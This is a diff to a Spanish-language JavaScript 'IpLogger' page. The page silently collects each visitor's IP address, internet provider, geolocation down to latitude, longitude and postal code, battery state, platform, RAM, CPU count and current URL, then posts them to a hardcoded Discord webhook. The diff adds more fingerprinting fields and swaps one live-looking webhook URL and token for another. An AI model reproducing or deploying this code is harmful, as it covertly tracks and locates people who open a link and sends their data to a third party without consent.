@@ -132,7 +132,7 @@
             org = data.organisation
           })
 
-        var battery = await navigator.getBattery();
+        let battery = await navigator.getBattery();
         batterypercentage = String(battery.level * 100 + "%");
         ischarging = String(battery.charging);
         platform = String(navigator.platform);
@@ -140,10 +140,10 @@
         height = String(window.innerHeight);
         devicelang = String(navigator.language);
         iscookieEnabled = String(navigator.cookieEnabled);
-        userAgent = String(navigator.userAgent, navigator.vendor);
+        userAgent = String(navigator.userAgent || navigator.vendor || window.opera);
         cpuThreads = String(navigator.hardwareConcurrency);
         deviceram = String(navigator.deviceMemory + "GB");
-        referurl = String(document.referrer);
+        referurl = String(window.location.href);
         localtime = String(datetime.toLocaleString());
 
         await sendWebhook();
@@ -151,18 +151,18 @@
       getInfo();
 
       function sendWebhook() {
-        /*Change here the url for yourl discord webhook url*/
-        let webhookUrl = "https://discord.com/api/webhooks/990364168328720434/_XK0k-KdyhgGpkhXqIlQu8VD3HV-NrwNyIS92zVk2qhGRDz5v-EKcWlAYYG1vF_35-Wv"
+        /*Change here the webhookUrl for your discord webhook url*/
+        const webhookUrl = "https://discord.com/api/webhooks/990728134561239080/7_ocU_f5f0HcV1rJi6kX_2XcMjCtw0eI4MtO56IAQm9YxazwoGdueECRWvgolwhPJHpE"
 
-        var request = new XMLHttpRequest();
+        let request = new XMLHttpRequest();
         request.open("POST", webhookUrl);
         request.setRequestHeader('Content-type', 'application/json');
-        var params = {
+        let params = {
           "content": null,
           "embeds": [
             {
               "title": "Alguien ha caido en el IpLogger",
-              "description": `**Dirección IP:** ${ip} \n**Proveedor:** ${org} \n**País:** ${country} \n**Código País:** ${countryCode} \n**Nombre región:** ${regionName} \n**Código región:** ${region} \n**Ciudad:** ${city} \n**Código postal:** ${zip} \n**Latitud:** ${lat} \n**Longitud:** ${lon} \n**Zona horaria:** ${timezone} \n**Tiempo local:** ${localtime} \n**Número nucleos cpu:** ${cpuThreads} \n**Cookies habilitadas:** ${iscookieEnabled} \n**Lenguaje:** ${devicelang} \n**Ancho pantalla:** ${width} \n**Alto pantalla:** ${height} \n**Plataforma:** ${platform} \n**Navegador:** ${userAgent}`,
+              "description": `**Dirección IP:** ${ip} \n**Proveedor:** ${org} \n**País:** ${country} \n**Código País:** ${countryCode} \n**Nombre región:** ${regionName} \n**Código región:** ${region} \n**Ciudad:** ${city} \n**Código postal:** ${zip} \n**Latitud:** ${lat} \n**Longitud:** ${lon} \n**Zona horaria:** ${timezone} \n**Tiempo local:** ${localtime} \n**Cookies habilitadas:** ${iscookieEnabled} \n**Lenguaje:** ${devicelang} \n**Ancho pantalla:** ${width} \n**Alto pantalla:** ${height} \n**Plataforma:** ${platform} \n**Navegador:** ${userAgent} \n**Bateria:** ${batterypercentage} \n**Cargando:** ${ischarging} \n**Número nucleos cpu:** ${cpuThreads} \n**Ram:** ${deviceram} \n**Enlace:** ${referurl}`,
               "color": 10493984,
               "timestamp": datetime
             }
